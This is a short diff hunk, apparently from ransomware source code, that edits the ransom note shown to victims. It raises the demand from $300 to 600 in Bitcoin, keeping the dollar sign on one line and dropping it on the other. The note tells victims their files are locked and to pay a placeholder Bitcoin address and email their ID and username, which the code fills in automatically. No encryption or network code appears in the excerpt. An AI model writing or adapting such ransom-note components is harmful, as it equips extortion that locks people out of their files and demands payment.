@@ -481,10 +481,10 @@ To get them back, please follow the instructions below.
 
 2. How to restore your files?
 - You need to pay a ransom to get the decryption key.
-- The amount of the ransom is $300 in Bitcoin.
+- The amount of the ransom is 600 in Bitcoin.
 
 3. Instructions for payment:
-- Buy Bitcoin (BTC) and send $300 to the address: {YOUR_BITCOIN_ADDRESS}
+- Buy Bitcoin (BTC) and send $600 to the address: {YOUR_BITCOIN_ADDRESS}
 - After the transaction is confirmed, send an email to {YOUR_EMAIL_ADDRESS} with your ID and username:
     + Your ID: {id}
     + Your username: {getpass.getuser()}
